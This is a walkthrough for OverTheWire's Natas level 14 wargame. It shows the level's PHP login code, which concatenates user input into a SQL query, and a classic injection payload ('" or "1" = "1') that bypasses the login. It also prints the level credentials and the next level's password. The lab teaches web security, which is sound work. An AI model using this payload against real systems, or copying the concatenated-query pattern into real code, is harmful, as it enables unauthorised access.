# Natas Level 14 → Level 15
(Updated: 13 August 2025)

## Credentials
- **Username:** `natas14`
- **Password:** `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`

## Connection
Level url: [http://natas14.natas.labs.overthewire.org/](http://natas14.natas.labs.overthewire.org/)

## Steps to Solve
1. Step 1 - This level require us to do some SQL Injection. First look at the source code -> `View sourcecode`.
2. Step 2 - We can see the PHP code:
```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```
Focus on this line:
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
**We can base on this line, to do SQL Injection attack**

3. Step 3 - Add the `username: anything` and `password: anything" or "1" = "1` the `$query` will become:
```sql
SELECT * FROM users where username="anything" and password="anything" or "1" = "1"
```
**By this, the WHERE condition is always true and return all rows in the table `users`.**

4. Step 4 - Submit the username and password so you can get the password for the next level.
5. Step 5 - Take the password to the next level.

## Next Level Password
`SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`
